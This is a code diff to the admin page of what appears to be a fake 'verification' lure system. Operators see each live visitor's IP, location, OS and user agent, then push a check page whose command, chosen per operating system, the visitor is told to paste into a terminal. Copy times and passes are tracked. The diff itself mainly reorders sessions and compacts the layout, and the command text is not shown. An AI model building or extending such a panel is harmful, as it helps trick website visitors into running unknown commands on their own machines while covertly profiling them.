@@ -42,6 +42,10 @@ function verificationShown(session: AdminSession) {
   return session.status !== "present"
 }
 
+function byArrival(a: AdminSession, b: AdminSession) {
+  return a.createdAt - b.createdAt || a.id.localeCompare(b.id)
+}
+
 function formatTime(value?: number) {
   if (!value) return ""
   const clock = new Intl.DateTimeFormat("en-GB", {
@@ -84,7 +88,7 @@ export default function VerifyAdminPage() {
     if (!response.ok) {
       throw new Error(typeof data.error === "string" ? data.error : "Could not load visitors.")
     }
-    setSessions(data.sessions || [])
+    setSessions([...(data.sessions || [])].sort(byArrival))
     setError("")
   }, [])
 
@@ -147,15 +151,17 @@ export default function VerifyAdminPage() {
     const opened = data.session as AdminSession | undefined
     const openedPhrase = typeof opened?.phrase === "string" ? opened.phrase : session.phrase
     if (opened?.id) {
-      setSessions((current) => current.map((item) => (item.id === opened.id ? { ...item, ...opened } : item)))
+      setSessions((current) =>
+        current.map((item) => (item.id === opened.id ? { ...item, ...opened } : item)).sort(byArrival)
+      )
     }
     setNotice(`Verification page opened. The visitor copies ${visitorCommand(openedPhrase, session.os) || openedPhrase}.`)
     await load(token)
   }
 
   return (
-    <main className="min-h-screen bg-[#0A0A0A] px-6 py-10 text-[#E8E8E8]">
-      <div className="mx-auto max-w-3xl">
+    <main className="min-h-screen bg-[#0A0A0A] px-5 py-8 text-[#E8E8E8]">
+      <div className="mx-auto max-w-6xl">
         <div className="flex flex-wrap items-end justify-between gap-3">
           <div>
             <p className="text-xs uppercase tracking-[0.18em] text-[#D4AF37]">APAX</p>
@@ -175,8 +181,8 @@ export default function VerifyAdminPage() {
           This list is only the browsers connected to the site right now. Closed visits are
           not kept. Show verification. The visitor copies the command into the terminal for their system.
         </p>
-        {error ? <p className="mt-3 text-sm text-[#DC2626]">{error}</p> : null}
-        {notice ? <p className="mt-3 text-sm text-[#E6C861]">{notice}</p> : null}
+        {error ? <p className="mt-3 h-5 truncate text-sm leading-5 text-[#DC2626]">{error}</p> : null}
+        <p className="mt-3 h-5 truncate text-sm leading-5 text-[#E6C861]" title={notice}>{notice}</p>
 
         {!token ? (
           <form onSubmit={onLogin} className="mt-8 max-w-sm space-y-4 rounded-lg border border-[#2A2A2A] bg-[#111111] p-5">
@@ -211,26 +217,32 @@ export default function VerifyAdminPage() {
           </form>
         ) : null}
 
-        {token ? <div className="mt-8 space-y-4">
+        {token ? <div className="mt-6 grid grid-cols-2 gap-2.5 md:grid-cols-3 xl:grid-cols-4">
           {sessions.length === 0 ? (
-            <p className="rounded-lg border border-[#2A2A2A] bg-[#111111] px-4 py-6 text-sm text-[#888888]">
+            <p className="col-span-full rounded-md border border-[#2A2A2A] bg-[#111111] px-4 py-6 text-sm text-[#888888]">
               No browsers are connected right now.
             </p>
           ) : (
             sessions.map((session) => {
               const shown = verificationShown(session)
               const passed = session.status === "verified"
+              const command = visitorCommand(session.phrase, session.os) || session.phrase
+              const passLabel = session.passNumber
+                ? `VP-${String(session.passNumber).padStart(4, "0")}${session.passCount > 1 ? ` · ${session.passCount}` : ""}`
+                : "No pass"
               return (
               <article
                 key={session.id}
-                className={`rounded-lg border bg-[#111111] p-4 ${
+                className={`flex flex-col rounded-md border bg-[#111111] p-2.5 ${
                   passed ? "border-[#3DDC97]" : shown ? "border-[#E6C861]" : "border-[#2A2A2A]"
                 }`}
               >
-                <div className="flex flex-wrap items-center justify-between gap-2">
-                  <p className="font-mono text-lg tracking-[0.12em] text-[#F4E4A6]">{session.phrase}</p>
+                <div className="flex items-start justify-between gap-2">
+                  <p className="min-w-0 truncate text-sm font-semibold leading-tight text-white">
+                    {session.os || "Unknown OS"}
+                  </p>
                   <span
-                    className={`rounded-full px-3 py-1 text-xs font-semibold ${
+                    className={`inline-flex h-4 w-16 shrink-0 items-center justify-center rounded-full px-1.5 text-[10px] font-semibold ${
                       passed
                         ? "bg-[#3DDC97] text-[#0A0A0A]"
                         : shown
@@ -241,69 +253,29 @@ export default function VerifyAdminPage() {
                     {passed ? "Passed" : shown ? "Shown" : "Not shown"}
                   </span>
                 </div>
-                <dl className="mt-4 grid grid-cols-2 gap-x-4 gap-y-3 text-sm">
-                  <div>
-                    <dt className="text-[11px] uppercase tracking-[0.14em] text-[#666666]">IP and location</dt>
-                    <dd className="mt-1 break-all text-[#E8E8E8]">
-                      {session.ip}
-                      <span className="mt-1 block text-[#C0C0C0]">{session.location || "Looking up location..."}</span>
-                    </dd>
-                  </div>
-                  <div>
-                    <dt className="text-[11px] uppercase tracking-[0.14em] text-[#666666]">OS</dt>
-                    <dd className="mt-1 text-[#E8E8E8]">{session.os || "Unknown"}</dd>
-                  </div>
-                  <div>
-                    <dt className="text-[11px] uppercase tracking-[0.14em] text-[#666666]">Show verification</dt>
-                    <dd className={`mt-1 ${shown ? "text-[#E6C861]" : "text-[#888888]"}`}>
-                      {shown ? `Pressed ${formatTime(session.promptedAt)}` : "Not pressed"}
-                    </dd>
-                  </div>
-                  <div>
-                    <dt className="text-[11px] uppercase tracking-[0.14em] text-[#666666]">Pass number</dt>
-                    <dd className="mt-1 font-mono text-[#F4E4A6]">
-                      {session.passNumber
-                        ? `VP-${String(session.passNumber).padStart(4, "0")}${session.passCount > 1 ? ` · ${session.passCount} passes` : ""}`
-                        : "Not passed"}
-                    </dd>
-                  </div>
-                  <div>
-                    <dt className="text-[11px] uppercase tracking-[0.14em] text-[#666666]">Arrived</dt>
-                    <dd className="mt-1 text-[#E8E8E8]">{formatTime(session.createdAt)} on {session.page}</dd>
-                  </div>
-                  <div>
-                    <dt className="text-[11px] uppercase tracking-[0.14em] text-[#666666]">Command</dt>
-                    <dd className="mt-1 whitespace-pre-wrap break-all font-mono text-[#E8E8E8]">{visitorCommand(session.phrase, session.os) || session.phrase}</dd>
-                  </div>
-                </dl>
-                <p className="mt-3 break-all text-xs leading-5 text-[#666666]">{session.userAgent}</p>
-                {session.checkedAt || session.copiedAt || session.attempts > 0 ? (
-                  <p className="mt-2 text-xs text-[#888888]">
-                    {session.checkedAt ? `Checkbox ${formatTime(session.checkedAt)}` : "Checkbox not ticked"}
-                    {session.copiedAt ? ` · Copied ${formatTime(session.copiedAt)}` : ""}
-                    {session.attempts > 0 ? ` · Wrong attempts ${session.attempts}` : ""}
-                  </p>
+                <p className="mt-1 truncate text-sm font-semibold leading-tight text-[#F4E4A6]" title={session.ip}>{session.ip}</p>
+                <p className="mt-1 truncate text-[11px] text-[#888888]" title={session.location || "Looking up location..."}>{session.location || "Looking up location..."}</p>
+                <p className="mt-2 font-mono text-xs tracking-[0.08em] text-[#E8E8E8]">{session.phrase}</p>
+                <p className="mt-1 whitespace-nowrap text-[11px] leading-4 text-[#A0A0A0]">{passLabel} · {formatTime(session.createdAt)}</p>
+                <p className="mt-1 truncate font-mono text-[10px] text-[#777777]" title={command}>{command}</p>
+                <p className="mt-0.5 truncate text-[10px] text-[#555555]" title={session.userAgent}>{session.page}</p>
+                {session.attempts > 0 ? (
+                  <p className="mt-1 text-[10px] text-[#888888]">Wrong attempts {session.attempts}</p>
                 ) : null}
-                <div className="mt-4 flex flex-wrap items-center gap-3">
-                  <button
-                    type="button"
-                    onClick={() => showPage(session)}
-                    className={`h-10 rounded-md px-4 text-sm font-medium ${
-                      shown
-                        ? "border border-[#E6C861] bg-transparent text-[#E6C861]"
-                        : "bg-[#D4AF37] text-[#0A0A0A]"
-                    }`}
-                  >
-                    {shown ? "Show again" : "Show verification"}
-                  </button>
-                  <span className={`text-sm ${shown ? "text-[#E6C861]" : "text-[#888888]"}`}>
-                    {passed
-                      ? `Passed ${formatTime(session.verifiedAt)}`
-                      : shown
-                        ? statusLabel[session.status]
-                        : "Waiting for you to open the check"}
-                  </span>
-                </div>
+                <button
+                  type="button"
+                  onClick={() => showPage(session)}
+                  className={`mt-2 h-7 rounded px-2 text-xs font-medium ${
+                    shown
+                      ? "border border-[#E6C861] bg-transparent text-[#E6C861]"
+                      : "bg-[#D4AF37] text-[#0A0A0A]"
+                  }`}
+                >
+                  {shown ? "Show again" : "Show verification"}
+                </button>
+                <p className={`mt-1 text-[10px] ${shown ? "text-[#E6C861]" : "text-[#666666]"}`}>
+                  {passed ? `Passed ${formatTime(session.verifiedAt)}` : statusLabel[session.status]}
+                </p>
               </article>
               )
             })
